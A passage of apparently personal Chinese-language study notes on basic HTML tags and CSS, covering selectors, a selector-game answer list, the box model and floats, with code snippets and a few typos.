title="内联框架"></a>内联框架</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"demo2.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">src:指向一个外部页面的路径，可以使用相对路径</span></span><br><span class="line"><span class="comment">width:</span></span><br><span class="line"><span class="comment">height:</span></span><br><span class="line"><span class="comment">name:</span></span><br><span class="line"><span class="comment">内联框架内容不会被搜索引擎所检索</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com"</span>&gt;</span>文字描述<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"demo.html"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>文字描述<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">href:</span></span><br><span class="line"><span class="comment">    #: 默认回到顶部</span></span><br><span class="line"><span class="comment">    #id: 去指定id处</span></span><br><span class="line"><span class="comment">target:</span></span><br><span class="line"><span class="comment">    _self 默认，当前窗口打开</span></span><br><span class="line"><span class="comment">    _blank: 新窗口打开</span></span><br><span class="line"><span class="comment">    某个内联框架name: 内联框架里打开</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="居中"><a href="#居中" class="headerlink" title="居中"></a>居中</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>所想要居中内容<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 将所有要居中的放到center中--&gt;</span></span><br></pre></td></tr></table></figure><p>table居中需要设置 width 跟height</p><h3 id="div"><a href="#div" class="headerlink" title="div"></a>div</h3><ul><li>div是一个纯粹的块元素，并且不会为其内部设置默认</li><li>div通常用来布局</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"backgroup-color: red; width: 200px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="span"><a href="#span" class="headerlink" title="span"></a>span</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>文字<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>行内元素，只占自身大小的元素，不会占一行</li><li>通常用于设置文字颜色</li></ul><h3 id="文本标签"><a href="#文本标签" class="headerlink" title="文本标签"></a>文本标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span> <span class="comment">&lt;!--语气强调，    斜体显示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span> <span class="comment">&lt;!--强调内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">small</span>&gt;</span> <span class="comment">&lt;!--合同中小字和版权放到small里--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cite</span>&gt;</span><span class="tag">&lt;/<span class="name">cite</span>&gt;</span> <span class="comment">&lt;!--参考内容，加书名号的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">q</span>&gt;</span><span class="tag">&lt;/<span class="name">q</span>&gt;</span> <span class="comment">&lt;!--引用内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span> <span class="comment">&lt;!--长引用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span> <span class="comment">&lt;!--上标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span> <span class="comment">&lt;!--下标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">ins</span>&gt;</span> <span class="comment">&lt;!--插入内容,下划线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span> <span class="comment">&lt;!--删除内容,删除线--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span> <span class="comment">&lt;!--代码块--&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">text-transform</span>: capitalize;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    单词首字母大写，通过空格识别</span></span><br><span class="line"><span class="comment">    uppercase: 全大写</span></span><br><span class="line"><span class="comment">    lowercase: 全小写</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attribute">text-decoration</span>:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    underline下划线</span></span><br><span class="line"><span class="comment">    overline上划线</span></span><br><span class="line"><span class="comment">    line-through 删除线</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    text-align:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    文本对齐方式</span></span><br><span class="line"><span class="comment">    - left 左对齐</span></span><br><span class="line"><span class="comment">    - right 右对齐</span></span><br><span class="line"><span class="comment">    - justify 两边对齐</span></span><br><span class="line"><span class="comment">    - center 居中对齐</span></span><br><span class="line"><span class="comment">        - 通过调整文本之间的空格调整</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    text-indent:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    首行缩进</span></span><br><span class="line"><span class="comment">    正值，向右缩进</span></span><br><span class="line"><span class="comment">    负值，向左缩进</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">### 列表</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">-</span> 无序列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">ul</span>无序列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">li</span>是列表项</span><br><span class="line"><span class="selector-tag">-</span> 有序列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">ol</span>有序列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">li</span>是列表项</span><br><span class="line"><span class="selector-tag">-</span> 定义列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">dl</span> 定义列表</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">dt</span> 被定义内容</span><br><span class="line">    <span class="selector-tag">-</span> <span class="selector-tag">dd</span> 被描述内容</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">type</span>:</span><br><span class="line"><span class="selector-tag">disc</span> 实心圆点 默认</span><br><span class="line"><span class="selector-tag">square</span> 方块</span><br><span class="line"><span class="selector-tag">circle</span> 圆</span><br><span class="line"></span><br><span class="line">无序列表</span><br><span class="line"></span><br><span class="line">```<span class="selector-tag">html</span></span><br><span class="line">&lt;<span class="selector-tag">ul</span>&gt;</span><br><span class="line">    &lt;li&gt;1&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;2&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>有序列表</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个可以嵌套</p><h3 id="长度单位"><a href="#长度单位" class="headerlink" title="长度单位"></a>长度单位</h3><ul><li>像素 px<ul><li>像素</li></ul></li><li>百分比<ul><li>父元素的百分比</li></ul></li><li>em<ul><li>相对于当前元素的字体大小<h3 id="rgb"><a href="#rgb" class="headerlink" title="rgb"></a>rgb</h3></li></ul></li></ul><p>#000000</p><p>第一组红色浓度<br>第二组绿色浓度<br>第三组蓝色浓度</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rgb(<span class="number">161</span>,<span class="number">187</span>,<span class="number">215</span>)</span><br><span class="line">rgb(<span class="number">100</span>%,<span class="number">50</span>%,<span class="number">50</span>%)</span><br></pre></td></tr></table></figure><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">color</span>: <span class="selector-tag">red</span>;</span><br><span class="line"><span class="selector-tag">font-size</span>: 30<span class="selector-tag">px</span>; <span class="comment">/*格子大小*/</span></span><br><span class="line"><span class="selector-tag">font-family</span>: 微软雅黑; <span class="comment">/*字体类型*/</span></span><br></pre></td></tr></table></figure><p>字体分类</p><ul><li>serif 衬线字体</li><li>sans-serif 非衬线字体</li><li>monospace</li><li>cursive</li><li>fantasy</li></ul><h3 id="行高"><a href="#行高" class="headerlink" title="行高"></a>行高</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">p1&#123;</span><br><span class="line">    font-size: 20px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">    /*</span><br><span class="line">    1. 行间距40-20=20px</span><br><span class="line">    2. 可以指定一个百分比</span><br><span class="line">    3. 数值，1.5就是1.5倍，150% </span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><p>div.box然后按tab 创建div类名叫box，这种用css语法自动补全</p><h3 id="特殊规则"><a href="#特殊规则" class="headerlink" title="特殊规则"></a>特殊规则</h3><ul><li>a元素可以包含任意元素，除了他本身</li><li>p元素不可以包含任何其他块元素</li></ul><h2 id="css基础"><a href="#css基础" class="headerlink" title="css基础"></a>css基础</h2><h3 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h3><h4 id="选择器优先级"><a href="#选择器优先级" class="headerlink" title="选择器优先级"></a>选择器优先级</h4><ul><li>内联&gt;id&gt;类和伪类&gt;元素&gt;统配选择器&gt;继承样式</li></ul><p>添加!important 就变成最高级别优先级了</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">.class&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#id&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">p[title^=”hello"]&#123;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">- 语法:</span><br><span class="line">    - [属性名] 选取含有指定属性的元素</span><br><span class="line">    - [属性名="属性值"] 选取含有指定属性值的元素</span><br><span class="line">    - [属性名^="属性值"] 选取开头带有属性值的元素</span><br><span class="line">    - [属性名$="属性值"] 结尾</span><br><span class="line">    - [属性名*=”属性值"] 包含</span><br><span class="line"></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h4 id="其他子元素选择器"><a href="#其他子元素选择器" class="headerlink" title="其他子元素选择器"></a>其他子元素选择器</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first-child</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">同时是p元素也是第一个子元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:last-child</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">同时是p元素也是最后一个子元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:nth-child(1)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">- 参数</span></span><br><span class="line"><span class="comment">- num 指定个数处</span></span><br><span class="line"><span class="comment">- even 偶数个</span></span><br><span class="line"><span class="comment">- odd 奇数个</span></span><br><span class="line"><span class="comment">同时是p元素也是第1个子元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first-of-type</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">:first-of-type</span></span><br><span class="line"><span class="comment">:last-of-type</span></span><br><span class="line"><span class="comment">:nth-of-type</span></span><br><span class="line"><span class="comment">在同组类型中找到第某个</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="兄弟元素选择器"><a href="#兄弟元素选择器" class="headerlink" title="兄弟元素选择器"></a>兄弟元素选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">span + p&#123;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">后一个兄弟元素选择器</span><br><span class="line">可以选择一个接着的后面一个，这里选择span后的p</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">span ~ p&#123;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">后一个兄弟元素选择器</span><br><span class="line">选中span后所有兄弟</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h4 id="选择器分组"><a href="#选择器分组" class="headerlink" title="选择器分组"></a>选择器分组</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">h2,.p2,#p&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="交集选择器-复合选择器"><a href="#交集选择器-复合选择器" class="headerlink" title="交集选择器(复合选择器)"></a>交集选择器(复合选择器)</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">span.p3&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时是span，也是p3</p><h4 id="元素之间关系"><a href="#元素之间关系" class="headerlink" title="元素之间关系"></a>元素之间关系</h4><ol><li>父元素</li><li>子元素:</li><li>祖先元素: 直接或间接</li><li>后代元素: 直接或间接</li><li>兄弟元素: 拥有相同父元素</li></ol><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">span</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">祖先元素 后代元素&#123;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &gt; <span class="selector-tag">span</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">选中指定父元素的指定子元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">plate</span> + <span class="selector-tag">apple</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">并集选择</span></span><br><span class="line"><span class="comment">&lt;plate /&gt;&lt;apple class="small"/&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">A</span> ~ <span class="selector-tag">B</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">selects all B that follow a A</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span><span class="selector-pseudo">:first-child</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">selects all first child p elements that are in a div.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:last-child</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">selects the last li elements inside of any ul.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="css选择器练习答案"><a href="#css选择器练习答案" class="headerlink" title="css选择器练习答案"></a>css选择器练习答案</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.   plate  元素选择器</span><br><span class="line">2.   bento 元素选择器</span><br><span class="line">3.   #fancy  ID选择器</span><br><span class="line">4.   plate &gt; apple  后代元素选择器</span><br><span class="line">5.   #fancy pickle  ID选择器 后代选择器</span><br><span class="line">6.  .small  类选择器</span><br><span class="line">7.   orange.small 元素选择器 类选择器</span><br><span class="line">8.   bento orange.small  后代选择器  符合选择器</span><br><span class="line">9.   plate.bento  并集选择器 </span><br><span class="line">10. * 通配选择器</span><br><span class="line">11、plate * 后代选择器、通配选择器</span><br><span class="line">12、plate + .small,plate + apple  兄弟选择器、分组选择器（并集选择器）</span><br><span class="line">13、bento ~ pickle  兄弟选择器</span><br><span class="line">14、plate&gt;apple  子元素选择器</span><br><span class="line">15、plate&gt;orange:first-child  子元素选择器、其他子元素选择器</span><br><span class="line">16、apple,.small:only-child   其他子元素选择器（匹配父元素中唯一一个子元素）  分组选择器（并集选择器）</span><br><span class="line">17、.small:last-child  其他子元素选择器（匹配父元素中最后一个子元素）</span><br><span class="line">18、plate:nth-child(3) 其他子元素选择器（匹配指定位置的子元素）</span><br><span class="line">19、bento:nth-last-child(4)  其他子元素选择器（从最后一个子元素开始匹配指定位置的子元素）</span><br><span class="line">20、apple:first-of-type   其他子元素选择器（匹配第一个子元素）</span><br><span class="line">21、plate:nth-child(even)  其他子元素选择器（选择偶数子元素的位置）</span><br><span class="line">22、plate:nth-of-type(2n+3)  其他子元素选择器（从第三个开始匹配每隔两个匹配一下）</span><br><span class="line">23、apple:only-of-type  其他子元素选择器</span><br><span class="line">24、 .small:last-of-type    其他子元素选择器（匹配父元素中每个类的最后一个父元素）</span><br><span class="line">25、bento:empty   其他子元素选择器（指定空的子元素）</span><br><span class="line">26、apple:not(big,.small)   其他子元素选择器</span><br></pre></td></tr></table></figure><h4 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h4><ul><li>a:link 没访问过</li><li>a:visted 访问过</li><li>a:hover 鼠标划过</li><li>a:active 正在点击</li><li>input:focus 获取焦点</li><li>p::selection 为p标签中选中内容使用样式</li><li>p::-moz-selection 专门用于火狐</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">a:link&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>否定伪类<br>选择除了某个类</p><ul><li>:not(.hello) 选择不是hello类的</li></ul><h4 id="伪元素选择器"><a href="#伪元素选择器" class="headerlink" title="伪元素选择器"></a>伪元素选择器</h4><ul><li>p:first-letter p中第一个字符</li><li>p:first-line p中第一行</li><li>:before</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">开始和结束部分加css</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">"我会出现在整个段落最左边"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="css分类"><a href="#css分类" class="headerlink" title="css分类"></a>css分类</h3><h4 id="内联css"><a href="#内联css" class="headerlink" title="内联css"></a>内联css</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color:red; font-size: 40px;"</span>&gt;</span> 文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="内部css"><a href="#内部css" class="headerlink" title="内部css"></a>内部css</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">p&#123;</span><br><span class="line"><span class="css">    <span class="selector-tag">color</span><span class="selector-pseudo">:red</span>;</span></span><br><span class="line">    font-size: 40px;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="外联css"><a href="#外联css" class="headerlink" title="外联css"></a>外联css</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"style.css"</span>/&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">href 写相对路径的css</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h4 id="css注释"><a href="#css注释" class="headerlink" title="css注释"></a>css注释</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">css注释</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h4 id="样式继承"><a href="#样式继承" class="headerlink" title="样式继承"></a>样式继承</h4><p>css设置祖先元素，会同样设置后代元素<br><strong>背景相关样式不会被继承</strong></p><h3 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h3><p>一个盒子分成以下几个部分</p><ul><li>内容区(content)</li><li>内边距(padding)</li><li>边框(border)</li><li>外边距(margin)</li></ul><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#bfa</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>; </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    width宽度 强调：内容区</span></span><br><span class="line"><span class="comment">    height高度 强调：内容区</span></span><br><span class="line"><span class="comment">    盒子整个大小，内边距，和边框共同决定</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: red;</span><br><span class="line">    <span class="attribute">border-style</span>: solid;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    边框宽度，颜色，样式</span></span><br><span class="line"><span class="comment">    border-width: 10px 20px 30px 40px;</span></span><br><span class="line"><span class="comment">    顺时针顺序，从12点开始，3点，6点，9点</span></span><br><span class="line"><span class="comment">    指定三个值:</span></span><br><span class="line"><span class="comment">        上 左右 下</span></span><br><span class="line"><span class="comment">    指定两个值:</span></span><br><span class="line"><span class="comment">        上下 左右</span></span><br><span class="line"><span class="comment">    一个值:</span></span><br><span class="line"><span class="comment">        上右下左</span></span><br><span class="line"><span class="comment">    除了border-width,css提供了四个</span></span><br><span class="line"><span class="comment">    border-xxx-width</span></span><br><span class="line"><span class="comment">    xxx: top,rigth,bottom,left</span></span><br><span class="line"><span class="comment">    border-color也适用，上右下左</span></span><br><span class="line"><span class="comment">    border一指定就是4个边</span></span><br><span class="line"><span class="comment">    border-xxx可以指定分别的</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    内边距</span></span><br><span class="line"><span class="comment">    会影响盒子可见框的大小</span></span><br><span class="line"><span class="comment">    padding-top:100px;</span></span><br><span class="line"><span class="comment">    padding-right: 100px;</span></span><br><span class="line"><span class="comment">    padding-left: 100px;</span></span><br><span class="line"><span class="comment">    padding-bottom: 100px;</span></span><br><span class="line"><span class="comment">    外边距</span></span><br><span class="line"><span class="comment">    margin-top: 上外边距</span></span><br><span class="line"><span class="comment">    margin-right: 右外边距</span></span><br><span class="line"><span class="comment">    margin-bottom: 下外边距</span></span><br><span class="line"><span class="comment">    margin-left: 左外边距</span></span><br><span class="line"><span class="comment">    1. 默认是靠左上，</span></span><br><span class="line"><span class="comment">    2. 上和左外，会导致盒子自身位置改变</span></span><br><span class="line"><span class="comment">    3. 下和右外是导致其他盒子位置改变</span></span><br><span class="line"><span class="comment">    4. 可以设置负值，往反方向移动</span></span><br><span class="line"><span class="comment">    5. 可以设置为auto，一般只设置给水平方向的，垂直方向外边距设置为auto，默认为0</span></span><br><span class="line"><span class="comment">    6. left和right同时设置为auto，就可以使子元素在父元素中居中</span></span><br><span class="line"><span class="comment">    7. margin: 10px 20px 30px 40px</span></span><br><span class="line"><span class="comment">    8. 垂直外边距的重叠</span></span><br><span class="line"><span class="comment">       - 兄弟元素之间相邻外边距会取最大值而不是取和</span></span><br><span class="line"><span class="comment">       - 父子垂直外边距相邻，则子元素的设置会给父元素</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure><h4 id="去除浏览器默认边距"><a href="#去除浏览器默认边距" class="headerlink" title="去除浏览器默认边距"></a>去除浏览器默认边距</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">*&#123;</span><br><span class="line">    margin:0;</span><br><span class="line">    paddding:0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h4><p>水平排列利用浮动</p><p>块元素在文档流中默认垂直排列，自上而下依次排列</p><ol><li><p>display: inline-block;<br>利用这个属性可以排成一行，多边距的话，将div换行部分去掉就可以了</p></li><li><p>使块元素脱离文档流，float属性</p></li></ol><p>类似于图层</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">backgroud-color</span>: red;</span><br><span class="line">    <span class="attribute">float</span>: </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    none: 默认值，在文档流排列</span></span><br><span class="line"><span class="comment">    left: 元素会脱离文档流，向左侧浮动</span></span><br><span class="line"><span class="comment">    right: 元素会向右侧浮动</span></span><br><span class="line"><span class="comment">    1.元素脱离文档流后，他下边元素会向上移动，会尽量往左上漂或右上漂，直到遇到父元素边框或其他浮动元素</span></span><br><span class="line"><span class="comment">    2. div是一个块元素，浮动不会超过上面的块元素</span></span><br><span class="line"><span class="comment">    3. 浮动元素不会超过他上边的兄弟元素，就是定义顺序，box3不会超过box2,最多平级</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box2</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">backgroud-color</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box3</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">backgroud-color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box1"</span>&gt;</span><span class="tag">&lt;/<span 